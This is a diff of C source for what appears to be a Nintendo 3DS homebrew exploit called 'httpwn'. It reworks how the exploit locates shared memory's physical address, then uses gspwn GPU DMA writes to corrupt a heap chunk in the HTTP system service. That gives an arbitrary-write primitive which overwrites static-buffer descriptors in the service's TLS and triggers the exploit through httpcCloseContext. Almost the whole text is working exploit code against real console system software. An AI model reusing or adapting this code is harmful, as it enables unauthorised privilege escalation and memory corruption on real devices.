@@ -2,6 +2,7 @@
 #include "lib/srv.h"
 #include "lib/httpc.h"
 #include "lib/gsp.h"
+#include "lib/csvc.h"
 
 #define MAGIC_USED_CHUNK        0x5544 // "UD" (used)
 #define MAGIC_FREE_CHUNK        0x4652 // "FR" (free)
@@ -16,28 +17,35 @@ typedef struct HeapChunk {
     u8 data[];
 } HeapChunk;
 
-static Result allocateRemainingMemory(void)
+static u32 guessHeapCurrentEndPa(void *linearAddr)
 {
-    Result res = 0;
+    // ASSUMPTION: we're an application
+    // ASSUMPTION: only one linear memory block has been allocated for the application
+    // if we fail here, we'll crash badly anyway
 
-    // Allocate all remaining APPLICATION memory (if any)
-    s64 tmp;
-    TRY(svcGetSystemInfo(&tmp, 0, 1));
-    u32 remainingSize = *(vu32 *)0x1FF80040 - (u32)tmp; // APPMEMALLOC
-    // Assume remainingSize <= 0x60000000
-    u32 tmp2 = 0x0E000000 - remainingSize;
-    if (R_FAILED(svcControlMemory(&tmp2, tmp2, 0, remainingSize, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE))) {
-        // We may be executing as an applet, try with SYSTEM
-        TRY(svcGetSystemInfo(&tmp, 0, 2));
-        remainingSize = *(vu32 *)0x1FF80044 - (u32)tmp; // SYSMEMALLOC
-        tmp2 = 0x0E000000 - remainingSize;
-        TRY(svcControlMemory(&tmp2, tmp2, 0, remainingSize, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE));
-    }
+    // Linear heap grows upwards from the start of the memregion
+    // Everything else grows downwards from the end of the memregion.
+    // PM lies about APPMEMALLOC
+    u32 appMemType = *(vu32 *)0x1FF80030;
+    appMemType = appMemType > 7 ? 7 : appMemType;
 
-    return res;
+    // appMemType 1 doesn't exist
+    static const u8 appRegionSizesMb[] = { 64, 64, 96, 80, 72, 32, 124, 178 };
+    u32 memRegionEnd = 0x20000000 + (appRegionSizesMb[appMemType] << 20);
+
+    // Figure out how much linear memory has been allocated
+    MemInfo info = {0};
+    PageInfo pgInfo;
+    svcQueryMemory(&info, &pgInfo, (u32)linearAddr);
+
+    // Figure out how memory in total (including code, etc.) has been allocated
+    s64 usedMemory = 0;
+    svcGetSystemInfo(&usedMemory, 0, 1);
+
+    return memRegionEnd - (usedMemory - (u32)info.size);
 }
 
-static Result doHttpwnArbwrite(u32 a, u32 b, u32 holePa, Handle srvHandle, Handle gspHandle, Handle httpServerHandle, void *linearWorkbuf)
+static Result doHttpwnArbwrite(u32 a, u32 b, u32 sharedMemPa, Handle srvHandle, Handle gspHandle, Handle httpServerHandle, void *linearWorkbuf)
 {
     Result res = 0;
 
@@ -48,9 +56,9 @@ static Result doHttpwnArbwrite(u32 a, u32 b, u32 holePa, Handle srvHandle, Handl
     // Apparently, with the proxy not being configured, our data is at +0 in the sharedmem and there's only 1 allocated heap chunk
     // You'll need to adapt the offsets if you set the default proxy.
 
-    // Read sharedmem
-    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
-    TRY(gspwn(gspHandle, convertLinearMemToPhys(linearWorkbuf), holePa, 0x1000));
+    // Read sharedmem. Use size trick to clean-invalidate the entire dcache+l2c by set/way
+    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x700000));
+    TRY(gspwn(gspHandle, convertLinearMemToPhys(linearWorkbuf), sharedMemPa, 0x1000));
     TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
 
     // Neighbour/second/last chunk is at +0x3C
@@ -66,10 +74,10 @@ static Result doHttpwnArbwrite(u32 a, u32 b, u32 holePa, Handle srvHandle, Handl
     };
     memcpy((u8 *)linearWorkbuf + 0x3C, &victimChunk, 0x10);
 
-    // Write sharedmem
+    // Write sharedmem. Use size trick to clean-invalidate the entire dcache+l2c by set/way
     TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
-    TRY(gspwn(gspHandle, holePa, convertLinearMemToPhys(linearWorkbuf), 0x1000));
-    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x1000));
+    TRY(gspwn(gspHandle, sharedMemPa, convertLinearMemToPhys(linearWorkbuf), 0x1000));
+    TRY(GSPGPU_FlushDataCache(gspHandle, linearWorkbuf, 0x700000));
 
     // Trigger exploit
     TRY(httpcCloseContext(httpServerHandle, &ctx));
@@ -89,28 +97,22 @@ static u32 guessTargetTlsBase(void)
     return 0x1FFA0000 + (numKips < 6 ? 0x2000 : 0) + (IS_N3DS ? 0x1000 : 0);
 }
 
-Result httpwn(Handle *outHandle, u32 baseSbufId, void *linearWorkbuf, void *hole, const u32 *sbufs, u32 numSbufs, Handle gspHandle)
+Result httpwn(Handle *outHandle, u32 baseSbufId, void *linearWorkbuf, const u32 *sbufs, u32 numSbufs, Handle gspHandle)
 {
     // hole must be in the middle of a LINEAR heap block
 
     Result res = 0;
-    u32 holePa = convertLinearMemToPhys(hole);
     Handle httpServerHandle;
     Handle srvHandle;
 
     TRY(srvInit(&srvHandle));
 
-    // Do heap ju-jistu:
-    allocateRemainingMemory();
-
-    // Deallocate the hole, which we know the physical address of
-    u32 tmp;
-    TRY(svcControlMemory(&tmp, (u32)hole, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE));
-
-    // Allocate the memory backing the shared memory block -- it's guaranteed to be at the same PA as the hole
+    // Allocate the memory backing the shared memory block -- we know its PA
     u32 tmp2 = 0x12000000;
     Handle sharedMemHandle;
     TRY(svcControlMemory(&tmp2, tmp2, 0, 0x1000, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE));
+
+    u32 sharedMemPa = guessHeapCurrentEndPa(linearWorkbuf);
     TRY(httpcInit(srvHandle, &httpServerHandle, &sharedMemHandle, (void *)tmp2, 0x1000));
 
     // Primitive is: *(a + 12) = b; *(b + 8) = a;
@@ -118,8 +120,8 @@ Result httpwn(Handle *outHandle, u32 baseSbufId, void *linearWorkbuf, void *hole
     u32 selfSbufId = baseSbufId; // needs to be >= 4!
     u32 targetTlsBase = guessTargetTlsBase();
     u32 targetTlsArea = targetTlsBase + 0x180 + 8 * selfSbufId;
-    TRY(doHttpwnArbwrite(targetTlsArea - 12, targetTlsArea + 2, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf)); // perfectly valid sbuf descriptor btw
-    TRY(doHttpwnArbwrite(targetTlsArea + 4 - 12, targetTlsArea, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf));
+    TRY(doHttpwnArbwrite(targetTlsArea - 12, targetTlsArea + 2, sharedMemPa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf)); // perfectly valid sbuf descriptor btw
+    TRY(doHttpwnArbwrite(targetTlsArea + 4 - 12, targetTlsArea, sharedMemPa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf));
 
     // We now have static buffer #4 covering its descriptor (tls+0x180+0x20), sz=0x40
     // Inject our static buffers
